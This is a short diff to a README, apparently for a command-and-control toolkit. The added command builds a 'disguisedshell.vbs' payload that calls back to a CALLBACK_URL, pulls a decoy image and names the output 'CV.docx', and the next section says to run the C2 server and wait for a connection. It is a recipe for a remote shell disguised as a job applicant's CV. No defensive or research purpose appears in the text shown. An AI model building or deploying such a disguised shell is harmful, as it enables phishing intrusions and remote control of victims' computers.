@@ -18,6 +18,10 @@ cl runscript.c /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup
 
 Or you can use the `generate.py` script under `scripts` to automate the build process
 
+```
+py -3.12 .\scripts\generate.py -p disguisedshell.vbs -a CALLBACK_URL=http://localhost:80/ FILE_URL=https://cdn.pixabay.com/photo/2024/02/26/19/39/monochrome-image-8598798_640.jpg FILE_OUTPUT_NAME=CV.docx -o CV_Name_Al  -s **[]!?
+```
+
 ## Run c2
 
 Wait for a connection ;).
